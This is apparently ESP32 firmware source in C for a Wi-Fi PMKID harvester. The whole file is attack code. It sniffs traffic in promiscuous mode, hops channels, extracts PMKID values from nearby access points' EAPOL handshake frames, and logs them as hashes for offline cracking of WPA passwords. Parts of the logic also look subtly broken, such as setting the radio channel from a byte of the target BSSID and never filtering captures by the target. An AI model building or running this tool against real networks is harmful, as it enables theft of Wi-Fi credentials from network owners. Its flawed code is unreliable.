#include "wifi_engine.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "storage_manager.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "PMKID";

#define EAPOL_ETHERTYPE  0x888E
#define KEY_INFO_PMKID   (1 << 3)

typedef struct {
    uint8_t bssid[6];
    bool capture_all;
    volatile bool running;
    uint32_t capture_count;
    esp_timer_handle_t ch_timer;
    uint8_t current_ch;
} harvest_ctx_t;

static harvest_ctx_t s_ctx = {0};

static void pmkid_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_ctx.running) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    uint16_t fc = (frame[1] << 8) | frame[0];
    uint8_t fc_type = (fc >> 2) & 0x03;
    uint8_t fc_subtype = (fc >> 4) & 0x0F;

    if (fc_type != 2) return;
    if (fc_subtype != 8 && fc_subtype != 0) return;

    uint8_t hdr_len = 24;
    if ((fc & 0x0080)) hdr_len += 2;
    if ((fc & 0x0008)) hdr_len += 4;

    uint8_t *bssid = &frame[16];
    uint8_t *src = &frame[10];

    uint8_t *llc = frame + hdr_len;
    if (len < hdr_len + 8 + 4) return;

    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;

    uint16_t ethertype = (llc[5] << 8) | llc[4];
    if (ethertype != EAPOL_ETHERTYPE) return;

    uint8_t *eapol = llc + 6;
    uint8_t eapol_len_hi = eapol[1];
    uint8_t eapol_len_lo = eapol[2];

    uint8_t eapol_type_val = eapol[0];
    if (eapol_type_val != 3) return;
    uint8_t desc_type = eapol[3];
    if (desc_type != 2) return;

    uint8_t *key_data = eapol + 4;
    uint16_t key_info = (key_data[1] << 8) | key_data[0];

    if (!(key_info & KEY_INFO_PMKID)) return;

    uint16_t key_data_len = (key_data[93] << 8) | key_data[92];
    uint8_t *kd = key_data + 95;

    if (key_data_len < 22) return;

    if (kd[0] == 0xDD && kd[1] >= 18) {
        if (kd[2] == 0x00 && kd[3] == 0x0F && kd[4] == 0xAC && kd[5] == 0x04) {
            uint8_t *pmkid = kd + 8;

            char hash_str[33];
            char bssid_str[18];
            wifi_mac_to_str(bssid, bssid_str);

            for (int i = 0; i < 16; i++) {
                sprintf(hash_str + (i * 2), "%02X", pmkid[i]);
            }
            hash_str[32] = '\0';

            storage_log_hash("PMKID", hash_str, bssid_str);
            s_ctx.capture_count++;
            ESP_LOGI(TAG, "PMKID[%lu] %s → %s", s_ctx.capture_count, bssid_str, hash_str);
        }
    }
}

static void ch_hop_cb(void *arg)
{
    if (!s_ctx.running) return;
    s_ctx.current_ch = (s_ctx.current_ch % 11) + 1;
    esp_wifi_set_channel(s_ctx.current_ch, WIFI_SECOND_CHAN_NONE);
}

esp_err_t wifi_pmkid_harvest_start(const uint8_t *target_bssid)
{
    if (s_ctx.running) wifi_pmkid_harvest_stop();

    s_ctx.capture_count = 0;
    s_ctx.capture_all = (target_bssid == NULL);

    if (target_bssid) {
        memcpy(s_ctx.bssid, target_bssid, 6);
    }

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL };
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(pmkid_rx_cb);

    if (s_ctx.capture_all) {
        s_ctx.current_ch = 1;
        esp_timer_create_args_t timer_args = {
            .callback = ch_hop_cb,
            .name = "pmkid_ch"
        };
        esp_err_t timer_ret = esp_timer_create(&timer_args, &s_ctx.ch_timer);
        if (timer_ret != ESP_OK) {
            ESP_LOGE(TAG, "Failed to create channel hop timer");
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(NULL);
            return timer_ret;
        }
        if (esp_timer_start_periodic(s_ctx.ch_timer, 300000) != ESP_OK) {
            ESP_LOGE(TAG, "Failed to start channel hop timer");
            esp_timer_delete(s_ctx.ch_timer);
            s_ctx.ch_timer = NULL;
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(NULL);
            return ESP_FAIL;
        }
    } else {
        esp_wifi_set_channel(target_bssid[5], WIFI_SECOND_CHAN_NONE);
    }

    s_ctx.running = true;
    ESP_LOGI(TAG, "PMKID harvester started (target: %s)",
             target_bssid ? "specific" : "all channels");
    return ESP_OK;
}

esp_err_t wifi_pmkid_harvest_stop(void)
{
    s_ctx.running = false;
    if (s_ctx.ch_timer) {
        esp_timer_stop(s_ctx.ch_timer);
        esp_timer_delete(s_ctx.ch_timer);
        s_ctx.ch_timer = NULL;
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    ESP_LOGI(TAG, "PMKID harvester stopped: %lu captures", s_ctx.capture_count);
    return ESP_OK;
}

uint32_t wifi_pmkid_get_capture_count(void)
{
    return s_ctx.capture_count;
}
